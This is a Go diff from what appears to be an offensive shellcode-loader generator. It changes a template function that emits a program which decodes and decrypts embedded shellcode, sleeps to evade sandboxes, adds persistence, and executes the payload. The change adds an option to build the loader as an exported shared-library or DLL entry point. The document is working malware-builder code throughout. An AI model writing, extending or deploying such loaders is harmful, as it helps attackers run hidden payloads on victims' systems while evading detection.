@@ -138,6 +138,7 @@ func GetMainTemplate(
 	sc string,
 	sleepTime uint,
 	persistData string,
+	shouldExport bool,
 ) string {
 
 	/* if hex encoding is used, it does not require to go through StdEncoding */
@@ -145,7 +146,15 @@ func GetMainTemplate(
 	if encoding == "hex" {
 		encCall = "enc"
 	}
-
+	exportImpStr := `import "C"`
+	exportexpStr := `
+func main() {}
+//export entry
+func entry() {`
+	if !shouldExport {
+		exportImpStr = ""
+		exportexpStr = "func main() {"
+	}
 	return fmt.Sprintf(`
 package main
 
@@ -153,12 +162,13 @@ import (
     "time"
     "os"
     enc "encoding/%s"
+	"fmt"
 )
 
+%s
 var Key = %s
 var Code = %s
-
-func main() {
+%s
 
     decodedSc, _ := %s.DecodeString(Code)
     decodedKey, _ := %s.DecodeString(Key)
@@ -169,8 +179,9 @@ func main() {
     }
 
     time.Sleep(%d * time.Second)
-	%s
+    
+	  %s
     ExecuteOrderSixtySix(decrypted)
 }
-    `, encoding, key, sc, encCall, encCall, sleepTime, persistData)
+    `, encoding, exportImpStr, key, sc, exportexpStr, encCall, encCall, sleepTime, persistData)
 }
